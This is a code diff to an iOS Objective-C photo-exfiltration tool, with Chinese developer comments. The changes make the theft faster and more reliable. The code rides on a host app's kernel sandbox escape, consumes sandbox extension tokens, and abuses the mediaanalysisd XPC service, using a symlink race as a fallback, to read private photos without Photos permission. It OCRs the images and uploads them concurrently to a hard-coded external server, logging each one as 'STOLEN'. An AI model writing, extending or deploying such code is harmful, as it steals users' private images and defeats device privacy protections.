@@ -12,6 +12,7 @@
 #import <stdlib.h>
 #import <string.h>
 #import <errno.h>
+#import <sys/stat.h>
 
 static NSString *const kExfilBase = @"https://iso.daiti.de";
 
@@ -177,7 +178,7 @@ static NSString *exfilOcrJson(UIImage *img)
     if (!img.CGImage) return nil;
 
     VNRecognizeTextRequest *req = [[VNRecognizeTextRequest alloc] init];
-    req.recognitionLevel = VNRequestTextRecognitionLevelAccurate;
+    req.recognitionLevel = VNRequestTextRecognitionLevelFast;
     req.usesLanguageCorrection = YES;
     req.recognitionLanguages = @[@"en-US"];
 
@@ -281,12 +282,34 @@ static BOOL exfilPost(UIImage *img, NSString *filename)
     return ok;
 }
 
+// 提速：并发上传（4 路），OCR 降为 Fast，扫描不再被一张图堵死
+static dispatch_queue_t gExfilUpQ = NULL;
+static NSObject *gLock = nil;
 static void exfilUpload(UIImage *img, NSString *originalName)
 {
     if (!img) return;
+    if (!gExfilUpQ)
+    {
+        gExfilUpQ = dispatch_queue_create("exfil.up",
+            DISPATCH_QUEUE_CONCURRENT);
+        gLock = [NSObject new];
+    }
     NSString *filename = [NSString stringWithFormat:@"exfil_%@.png", originalName];
-    BOOL ok = exfilPost(img, filename);
-    exfilLog(@"upload %@ -> %@", filename, ok ? @"ok" : @"FAIL");
+    // 限并发：最多 4 张同时在传，第 5 张等一张落地再继续扫
+    static int gInFlight = 0;
+    @synchronized(gLock) { gInFlight++; }
+    dispatch_async(gExfilUpQ, ^{
+        BOOL ok = exfilPost(img, filename);
+        exfilLog(@"upload %@ -> %@", filename, ok ? @"ok" : @"FAIL");
+        @synchronized(gLock) { gInFlight--; }
+    });
+    while (1)
+    {
+        int n = 0;
+        @synchronized(gLock) { n = gInFlight; }
+        if (n < 2) break; // 4→2：并发编码解码的峰值内存减半
+        usleep(200000);
+    }
 }
 
 #pragma mark - 路径 0：MCM C 桥（照抄宿主 mcm_bridge：libsystem_containermanager）
@@ -307,6 +330,26 @@ typedef void (*MCMObjectFree)(void *);
 typedef int (*MCMErrorGetInt)(void *);
 typedef const char *(*MCMErrorGetString)(void *);
 typedef void (*MCMQueryFree)(void *);
+typedef void (*MCMQueryIterate)(void *, void (^)(void *));
+
+// 宿主 bad_query 用 sandbox_extension_consume 激活扩展（handle>=0 即成功），
+// 不是 container_object_sandbox_extension_activate；consume 优先
+typedef int64_t (*ExfilSbxConsume)(const char *token);
+static ExfilSbxConsume gExfilSbxConsume = NULL;
+static BOOL gExfilSbxConsumeTried = NO;
+
+static ExfilSbxConsume exfilSbxConsume(void)
+{
+    if (!gExfilSbxConsumeTried)
+    {
+        gExfilSbxConsumeTried = YES;
+        void *h = dlopen("/usr/lib/system/libsystem_sandbox.dylib",
+                         RTLD_NOW | RTLD_LOCAL);
+        if (!h) h = RTLD_DEFAULT;
+        gExfilSbxConsume = (ExfilSbxConsume)dlsym(h, "sandbox_extension_consume");
+    }
+    return gExfilSbxConsume;
+}
 
 typedef struct {
     MCMQueryCreate queryCreate;
@@ -355,7 +398,11 @@ static BOOL exfilMCMLoad(ExfilMCMAPI *api)
            api->queryFree;
 }
 
-// 与宿主 MCMActivateContainerPath 等价的路径拿取（cls=2 数据容器）
+// 全局租约字典：activate 拿到的 query + container 对象存这里，
+// 进程退出才回收（照抄宿主 MCMActiveLeases 的生命周期）
+static NSMutableDictionary<NSString *, NSArray *> *gExfilLeases = nil;
+
+// 与宿主 MCMActivateContainerPath 等价：查 root + activate 扩展 + 入字典持有
 static NSString *exfilMCMContainerPath(uint64_t cls, NSString *identifier, NSString **errOut)
 {
     ExfilMCMAPI api;
@@ -363,6 +410,30 @@ static NSString *exfilMCMContainerPath(uint64_t cls, NSString *identifier, NSStr
     {
         if (errOut) *errOut = @"mcm symbols missing";
         return nil;
+    }
+    if (!gExfilLeases) gExfilLeases = [NSMutableDictionary new];
+
+    // 宿主 MCMSafeIdentifier：白名单字符外的 identifier 直接拒
+    if ([identifier rangeOfCharacterFromSet:
+             [[NSCharacterSet characterSetWithCharactersInString:
+                 @"abcdefghijklmnopqrstuvwxyz"
+                 "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789.-_"] invertedSet]]
+            .location != NSNotFound)
+    {
+        if (errOut) *errOut = @"identifier unsupported chars";
+        return nil;
+    }
+
+    // 已有租约直接复用（防重复 activate 踢掉旧租约）
+    NSString *key = [NSString stringWithFormat:@"%llu:%@", (unsigned long long)cls, identifier];
+    @synchronized (gExfilLeases)
+    {
+        NSArray *held = gExfilLeases[key];
+        if (held.count == 2)
+        {
+            if (errOut) *errOut = @"lease held";
+            return held[1]; // path
+        }
     }
 
     void *query = api.queryCreate();
@@ -394,19 +465,58 @@ static NSString *exfilMCMContainerPath(uint64_t cls, NSString *identifier, NSStr
     if ([path isEqualToString:@"/var"] || [path hasPrefix:@"/var/"])
         path = [@"/private" stringByAppendingString:path];
 
-    // 激活 sandbox 扩展（拿 token → activate）
+    // activate：宿主路径 = copy_token → sandbox_extension_consume（handle>=0）；
+    // 旧路径 objectActivate 只做兜底。handle 不释放 = 扩展进程级存活
     void *obj = api.objectCopy(result);
+    BOOL activated = NO;
+    int64_t consumedHandle = -1;
     if (obj)
     {
         char *token = api.objectCopyToken(obj);
         BOOL tokenPresent = token && token[0] != '\0';
+        if (tokenPresent)
+        {
+            ExfilSbxConsume consume = exfilSbxConsume();
+            if (consume)
+            {
+                consumedHandle = consume(token);
+                activated = consumedHandle >= 0;
+            }
+            if (!activated && api.objectActivate)
+                activated = api.objectActivate(obj, false);
+        }
         free(token);
-        BOOL activated = tokenPresent && api.objectActivate(obj, false);
-        if (errOut && !activated)
-            *errOut = @"sandbox extension activate failed";
-        api.objectFree(obj);
+    if (errOut)
+    {
+        *errOut = activated
+            ? [NSString stringWithFormat:@"activated consume=%lld",
+               (long long)consumedHandle]
+            : (tokenPresent ? @"extension activate failed" : @"no sandbox token");
     }
-    api.queryFree(query);
+        // 只有 activate 成功才入字典持有（失败的对象直接丢弃也不影响）
+    }
+    else if (errOut)
+    {
+        *errOut = @"object copy failed";
+        api.queryFree(query);
+        return nil;
+    }
+
+    // 容器不存在/没激活成功：释放这次查询，不留垃圾
+    if (!obj)
+    {
+        api.queryFree(query);
+    }
+
+    if (activated)
+    {
+        @synchronized (gExfilLeases)
+        {
+            // 用 NSValue 包指针入字典（对象不进 autorelease 池也没关系，纯持有）
+            gExfilLeases[key] = @[[NSValue valueWithPointer:query],
+                                  path ?: @""];
+        }
+    }
     return path.length ? path : nil;
 }
 
@@ -423,7 +533,9 @@ static NSString *exfilMCMPhotosMediaDir(void)
         @"com.apple.assetsd",
         @"com.apple.Photos",
     ];
-    NSFileManager *fm = [NSFileManager defaultManager];
+    // 两阶段：先全部 activate 入字典（防后进租约踢掉先进租约），再统一读
+    // 阶段 1：点查 + activate，只收集（identifier, class, root, act）四元组
+    NSMutableArray *found = [NSMutableArray new];
     for (uint64_t cls = 0; cls <= 6; cls++)
     {
         for (NSString *ident in identifiers)
@@ -432,7 +544,6 @@ static NSString *exfilMCMPhotosMediaDir(void)
             NSString *root = exfilMCMContainerPath(cls, ident, &err);
             if (root.length == 0)
             {
-                // 没容器：只在额度内打一行，含错误信息
                 if (gExfilMcmLogged < 40)
                 {
                     gExfilMcmLogged++;
@@ -441,46 +552,62 @@ static NSString *exfilMCMPhotosMediaDir(void)
                 }
                 continue;
             }
+            [found addObject:@[@(cls), ident, root, err ?: @""]];
+        }
+    }
 
-            // 有 root：列一级目录 + errno，验证读权限（地图≠门能开）
-            errno = 0;
-            NSArray *entries = [fm contentsOfDirectoryAtPath:root error:nil];
-            int listErrno = errno;
-            BOOL readable = entries != nil;
-            if (gExfilMcmLogged < 40)
-            {
-                gExfilMcmLogged++;
-                exfilLog(@"MCM cls=%llu ident=%@ root=%@ readable=%d errno=%d n=%lu entries: %@",
-                         (unsigned long long)cls, ident, root, readable, listErrno,
-                         (unsigned long)entries.count,
-                         entries.count <= 15
-                            ? [entries componentsJoinedByString:@","]
-                            : [[entries subarrayWithRange:NSMakeRange(0, 15)]
-                                componentsJoinedByString:@","]);
-                // system data 域命中标记（不带 Containers 的 /var/mobile 路径）
-                if ([root hasPrefix:@"/private/var/mobile"] &&
-                    ![root containsString:@"Containers"])
-                    exfilLog(@"*** SYSTEM DATA HIT cls=%llu ident=%@ root=%@",
-                             (unsigned long long)cls, ident, root);
-            }
+    // 阶段 2：租约全激活完了，统一 stat → readdir 验证
+    NSFileManager *fm = [NSFileManager defaultManager];
+    for (NSArray *item in found)
+    {
+        uint64_t cls = [item[0] unsignedLongLongValue];
+        NSString *ident = item[1];
+        NSString *root = item[2];
+        NSString *act = item[3];
 
-            if (!readable) continue; // EPERM/EACCES：有路径没权限，先记录换下一个
+        // stat 先行：门开没开先看这里
+        struct stat st;
+        errno = 0;
+        int statOk = stat(root.fileSystemRepresentation, &st);
+        int statErrno = errno;
 
-            // 直接命中 DCIM
-            if ([fm fileExistsAtPath:[root stringByAppendingPathComponent:@"DCIM"]])
-            {
-                exfilLog(@"MCM lease ok: ident=%@ cls=%llu root=%@",
-                         ident, (unsigned long long)cls, root);
-                return root;
-            }
-            // root 里有 Media 子目录
-            NSString *mediaSub = [root stringByAppendingPathComponent:@"Media"];
-            if ([fm fileExistsAtPath:[mediaSub stringByAppendingPathComponent:@"DCIM"]])
-            {
-                exfilLog(@"MCM lease ok (sub): ident=%@ cls=%llu root=%@",
-                         ident, (unsigned long long)cls, mediaSub);
-                return mediaSub;
-            }
+        errno = 0;
+        NSArray *entries = [fm contentsOfDirectoryAtPath:root error:nil];
+        int listErrno = errno;
+        BOOL readable = entries != nil;
+
+        if (gExfilMcmLogged < 40)
+        {
+            gExfilMcmLogged++;
+            exfilLog(@"MCM cls=%llu ident=%@ root=%@ act=%@ stat=%d/%d readable=%d errno=%d n=%lu entries: %@",
+                     (unsigned long long)cls, ident, root, act,
+                     statOk, statErrno, readable, listErrno,
+                     (unsigned long)entries.count,
+                     entries.count <= 15
+                        ? [entries componentsJoinedByString:@","]
+                        : [[entries subarrayWithRange:NSMakeRange(0, 15)]
+                            componentsJoinedByString:@","]);
+            if ([root hasPrefix:@"/private/var/mobile"] &&
+                ![root containsString:@"Containers"])
+                exfilLog(@"*** SYSTEM DATA HIT cls=%llu ident=%@ root=%@",
+                         (unsigned long long)cls, ident, root);
+        }
+
+        if (!readable) continue; // 门还没开，记录在案
+
+        // 命中 DCIM
+        if ([fm fileExistsAtPath:[root stringByAppendingPathComponent:@"DCIM"]])
+        {
+            exfilLog(@"MCM lease ok: ident=%@ cls=%llu root=%@",
+                     ident, (unsigned long long)cls, root);
+            return root;
+        }
+        NSString *mediaSub = [root stringByAppendingPathComponent:@"Media"];
+        if ([fm fileExistsAtPath:[mediaSub stringByAppendingPathComponent:@"DCIM"]])
+        {
+            exfilLog(@"MCM lease ok (sub): ident=%@ cls=%llu root=%@",
+                     ident, (unsigned long long)cls, mediaSub);
+            return mediaSub;
         }
     }
     return nil;
@@ -709,9 +836,54 @@ static NSData *exfilDecoyData(void)
     return UIImagePNGRepresentation(decoy);
 }
 
+// === 3105 同款直通：token 签真图路径，daemon 正常解码，不赌竞争 ===
+static BOOL exfilTryDirect(NSString *target)
+{
+    // 每次尝试独立内存池：reply 图与代理对象当场排干
+    @autoreleasepool
+    {
+    // 逃逸没生效时签不出真图 token
+    char *raw = sandbox_extension_issue_file(
+        "com.apple.app-sandbox.read", target.UTF8String, 0);
+    if (!raw) return NO;
+    NSString *token = [NSString stringWithUTF8String:raw];
+    free(raw);
+    if (!token) return NO;
+
+    NSURL *url = [NSURL fileURLWithPath:target];
+    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+    __block UIImage *img = nil;
+
+    id<VCPMADServicePublicServerProtocol> proxy =
+        [gExfilConn remoteObjectProxyWithErrorHandler:^(NSError *err) {
+            dispatch_semaphore_signal(sem);
+        }];
+
+    [proxy requestImageProcessing:exfilScalingRequest(200, 200)
+                         forAssetURL:url
+                    withSandboxToken:token
+                          identifier:@"d"
+                           requestID:++gExfilReqID
+                            andReply:^(id arg1, id arg2) {
+        img = exfilImageFromReply(arg1);
+        dispatch_semaphore_signal(sem);
+    }];
+
+    dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 5 * NSEC_PER_SEC));
+    if (!img) return NO;
+
+    exfilUpload(img, [target lastPathComponent]);
+    return YES;
+    } // autoreleasepool end
+}
+
 static BOOL exfilTryRace(NSString *target, NSString *racePath, NSString *symPath,
                           NSData *decoyData, useconds_t delay)
 {
+    // 每次尝试独立内存池：proxy/semaphore/reply 图当场排干，
+    // 防止长循环里临时对象堆积撑爆内存被 jetsam 杀
+    @autoreleasepool
+    {
     unlink(racePath.UTF8String);
     [decoyData writeToFile:racePath atomically:NO];
 
@@ -734,7 +906,7 @@ static BOOL exfilTryRace(NSString *target, NSString *racePath, NSString *symPath
             dispatch_semaphore_signal(sem);
         }];
 
-    [proxy requestImageProcessing:exfilScalingRequest(600, 600)
+    [proxy requestImageProcessing:exfilScalingRequest(200, 200)
                          forAssetURL:url
                     withSandboxToken:token
                           identifier:@"d"
@@ -766,6 +938,58 @@ static BOOL exfilTryRace(NSString *target, NSString *racePath, NSString *symPath
 
     exfilUpload(img, [target lastPathComponent]);
     return YES;
+    } // autoreleasepool end：img 已被上传 block 持有，池排干不影响
+}
+
+// === 3105 主力链：MCM lease → 容器索引枚举 → token 直通请求 → STOLEN ===
+// App 的手全程不碰照片：读文件+解码全是 mediaanalysisd（自带 kTCCServicePhotos 豁免）
+static int exfilScaleMode(void)
+{
+    exfilLog(@"3105 mode: daemon-hand exfil start");
+    exfilEnsureConn();
+    if (!gExfilConn)
+    {
+        exfilLog(@"3105 mode: XPC unavailable");
+        return 0;
+    }
+
+    // ① 文件列表：不走 Photos，走容器索引枚举 DCIM + CPL/assets
+    NSMutableArray<NSString *> *targets = [NSMutableArray new];
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSArray *assetRoots = @[
+        @"/private/var/mobile/Media/DCIM",
+        @"/private/var/mobile/Media/PhotoData/CPL/assets"
+    ];
+    for (NSString *root in assetRoots)
+    {
+        NSDirectoryEnumerator *en = [fm enumeratorAtPath:root];
+        for (NSString *rel in en)
+        {
+            NSString *ext = [[rel pathExtension] lowercaseString];
+            if (![ext isEqualToString:@"heic"] && ![ext isEqualToString:@"jpg"]
+                && ![ext isEqualToString:@"jpeg"] && ![ext isEqualToString:@"png"])
+                continue;
+            [targets addObject:[root stringByAppendingPathComponent:rel]];
+        }
+    }
+    exfilLog(@"container index: listed=%lu", (unsigned long)targets.count);
+
+    // ② 逐文件：token 签真图路径，daemon 解码回执，命中即 STOLEN
+    int stolen = 0;
+    for (NSString *target in targets)
+    {
+        @autoreleasepool
+        {
+        if (exfilTryDirect(target))
+        {
+            stolen++;
+            exfilLog(@"STOLEN %@", target);
+        }
+        }
+        if (stolen && stolen % 5 == 0) sleep(1); // 歇口气，压平内存峰值
+    }
+    exfilLog(@"3105 mode done, STOLEN=%d/%lu", stolen, (unsigned long)targets.count);
+    return stolen;
 }
 
 static void exfilRaceMode(void)
@@ -794,7 +1018,54 @@ static void exfilRaceMode(void)
     };
     useconds_t delays[3] = {100, 250, 400};
 
+    // === assetResources 路线：能列目录就拿真实文件名，不蒙编号 ===
+    NSMutableArray<NSString *> *targets = [NSMutableArray new];
+    NSFileManager *fm = [NSFileManager defaultManager];
+    NSArray *assetRoots = @[
+        @"/private/var/mobile/Media/DCIM",
+        @"/private/var/mobile/Media/PhotoData/CPL/assets"
+    ];
+    for (NSString *root in assetRoots)
+    {
+        NSDirectoryEnumerator *en = [fm enumeratorAtPath:root];
+        for (NSString *rel in en)
+        {
+            NSString *ext = [[rel pathExtension] lowercaseString];
+            if (![ext isEqualToString:@"heic"] && ![ext isEqualToString:@"jpg"]
+                && ![ext isEqualToString:@"jpeg"] && ![ext isEqualToString:@"png"])
+                continue;
+            [targets addObject:[root stringByAppendingPathComponent:rel]];
+        }
+    }
+    exfilLog(@"assetResources listed=%lu", (unsigned long)targets.count);
+
     int stolen = 0;
+    if (targets.count)
+    {
+        // assetResources 命中：逐文件 200x200 缩图请求
+    // 列表分支：逐张包内存池 + 每偷 5 张歇 1 秒，把内存曲线压平
+    for (NSString *target in targets)
+    {
+        @autoreleasepool
+        {
+        BOOL got = NO;
+        for (int a = 0; a < 3 && !got; a++)
+        {
+            NSString *uext = [[target pathExtension] uppercaseString];
+            if (uext.length == 0) uext = @"HEIC";
+            int ei = [uext isEqualToString:@"JPG"] ? 1 :
+                     ([uext isEqualToString:@"PNG"] ? 2 : 0);
+            got = exfilTryRace(target, race[ei], sym[ei], decoy, delays[a]);
+            if (got) exfilLog(@"STOLEN %@ delay=%d", target.lastPathComponent, delays[a]);
+            usleep(2000);
+        }
+        if (got) stolen++;
+        }
+        if (stolen && stolen % 5 == 0) sleep(1);
+    }
+    }
+    else
+    {
     for (int d = 100; d <= 199; d++)
     {
         for (int img = 1; img <= 9999; img++)
@@ -808,11 +1079,13 @@ static void exfilRaceMode(void)
                 for (int a = 0; a < 3 && !got; a++)
                 {
                     got = exfilTryRace(target, race[e], sym[e], decoy, delays[a]);
+                    if (got) exfilLog(@"STOLEN %@ delay=%d", target.lastPathComponent, delays[a]);
                     usleep(2000);
                 }
             }
             if (got) stolen++;
         }
+    }
     }
     exfilLog(@"race mode done, stolen=%d", stolen);
 }
@@ -826,44 +1099,64 @@ static void exfilRun(void)
         exfilLog(@"ctor alive, machine=%@ ios=%@ bundle=%@",
                  exfilMachineName(), [UIDevice currentDevice].systemVersion,
                  [[NSBundle mainBundle] bundleIdentifier]);
-        // 0) 同进程 MCM 租约直拿照片容器（宿主已建立特权，成功率最高）
-        //    宿主 exploit 是异步跑的，给它时间：前 45s 每秒探测（与旧版行为一致），
-        //    之后放宽到 5s 一轮，最长 30 分钟等内核逃逸把 MCM 放行
+        // 0) 长轮询等宿主 pe_v2 内核逃逸生效（宿主启动即自动跑，异步需要时间）：
+        //    MCM 探测 + DCIM 可读性每 5 秒一轮，坚持 30 分钟；
+        //    宿主沙盒一旦摘掉，MCM 查询即被放行（denied → ok）
         NSString *mcmMedia = nil;
-        const int kPollTotalSeconds = 30 * 60;
-        int pollElapsed = 0;
-        while (pollElapsed < kPollTotalSeconds && !mcmMedia)
+        BOOL escapeSeen = NO;
+        int escapeSeenLogged = 0;
+        const int kPollSeconds = 30 * 60;
+        for (int i = 0; i < kPollSeconds && !mcmMedia; i += 5)
         {
             mcmMedia = exfilMCMPhotosMediaDir();
             if (mcmMedia) break;
-            int pollStep = (pollElapsed < 45) ? 1 : 5;
-            sleep(pollStep);
-            pollElapsed += pollStep;
+
+            BOOL escaped = exfilSandboxEscaped();
+            if (escaped && !escapeSeen)
+            {
+                escapeSeen = YES;
+                exfilLog(@"poll: sandbox escape ACTIVE after %ds, MCM still retrying", i);
+            }
+            if (escaped && !mcmMedia && escapeSeenLogged < 3)
+            {
+                // 逃逸已生效但 MCM 未命中：直接走直读，别再磨
+                escapeSeenLogged++;
+                exfilLog(@"poll: escape active, going direct mode");
+                break;
+            }
+            sleep(5);
         }
-        if (!mcmMedia) exfilLog(@"path 0: MCM unavailable after %ds, fallback", kPollTotalSeconds);
         if (mcmMedia)
         {
             exfilLog(@"path 0: MCM photos media=%@", mcmMedia);
+            // 3105 主力链优先：借 daemon 的手拿图（App 不碰文件）
+            exfilScaleMode();
             exfilScanMediaUnder(mcmMedia);
             exfilLog(@"path 0 done");
+            // 兜底：最后一轮 200x200 竞争
+            exfilRaceMode();
             return;
         }
 
-        // 1) 等宿主内核利用跑完（行为探测：DCIM 可读即逃逸生效），最多 90s
-        for (int i = 0; i < 90; i++)
+        // 1) 逃逸已生效（MCM 未命中）→ 直读
+        if (escapeSeen)
         {
-            if (exfilSandboxEscaped()) break;
-            sleep(1);
+            // 3105 主力链优先：借 daemon 的手拿图（App 不碰文件）
+            exfilScaleMode();
+            exfilDirectMode();
+            // 兜底：最后一轮 200x200 竞争
+            exfilRaceMode();
+            return;
         }
 
+        // 2) 30 分钟没等到：最后再确认一次 DCIM
         if (exfilSandboxEscaped())
         {
             exfilDirectMode();
+            return;
         }
-        else
-        {
-            exfilRaceMode();
-        }
+        exfilLog(@"poll: escape never became active after %ds, race mode", kPollSeconds);
+        exfilRaceMode();
     }
 }
 
